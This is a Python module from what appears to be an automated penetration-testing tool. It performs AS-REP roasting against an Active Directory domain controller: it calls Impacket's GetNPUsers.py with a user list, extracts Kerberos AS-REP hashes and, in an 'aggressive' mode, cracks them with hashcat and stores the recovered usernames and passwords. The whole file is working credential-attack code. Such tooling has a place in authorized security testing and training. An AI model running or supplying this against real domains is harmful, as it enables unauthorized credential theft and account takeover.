import subprocess
import tempfile
import os
import time

from utils.output import print
from modules.hashcrack import crack_hash
from utils.findings import add_misconfiguration, add_discovery, add_credential

def run_asrep_roast(domain, dc_ip, users, verbose=False, aggressive=False):

    if not users:
        print("[*] No users available for AS-REP roasting.")
        return

    print("[*] Attempting AS-REP roasting...")

    try:
        # write users to temporary file
        with tempfile.NamedTemporaryFile(mode="w", delete=False) as f:
            for user in users:
                f.write(user + "\n")
            user_file = f.name

        cmd = [
            "GetNPUsers.py",
            f"{domain}/",
            "-dc-ip",
            dc_ip,
            "-no-pass",
            "-usersfile",
            user_file,
            "-format",
            "hashcat"
        ]

        if verbose:
            print("[DEBUG] Command:")
            print(" ".join(cmd))

        # timeout after 20s to avoid hanging on non-AD or no Kerberos response
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )

        try:
            stdout, stderr = proc.communicate(timeout=20)  
        except subprocess.TimeoutExpired:
            proc.kill()
            stdout, stderr = proc.communicate()
            print("[!] AS-REP roast timed out (likely non-AD / no Kerberos response)")
            return

        output = stdout + stderr

        if verbose:
            print(output)

        hashes = []

        for line in output.splitlines():
            if "$krb5asrep$" in line:
                hashes.append(line.strip())

        if hashes:
            print("[+] AS-REP hashes found.")

            # only if aggressive is on; this slightly crossing over into forbidden in OSCP
            if aggressive:
                print("[*] Aggressive mode enabled.")
                print("[*] Attempting to crack AS-REP hashes with hashcat...")

                for h in hashes:
                    cracked = crack_hash(h)

                    if cracked:
                        print("[+] Cracked credentials:")
                        print(cracked)

                        if ":" in cracked:
                            username, password = cracked.strip().split(":", 1)

                            add_discovery(
                                "Valid credentials (AS-REP roast)",
                                f"{username}:{password}",
                                "asrep"
                            )

                            add_credential(username, password, "asrep")

            else:
                print("[*] Aggressive mode disabled: Use hashcat -m 18200")

        elif proc.returncode == 0:
            print("[*] No AS-REP roastable users found.")

        os.unlink(user_file)

    except Exception as e:
        print(f"[!] AS-REP roasting failed: {e}")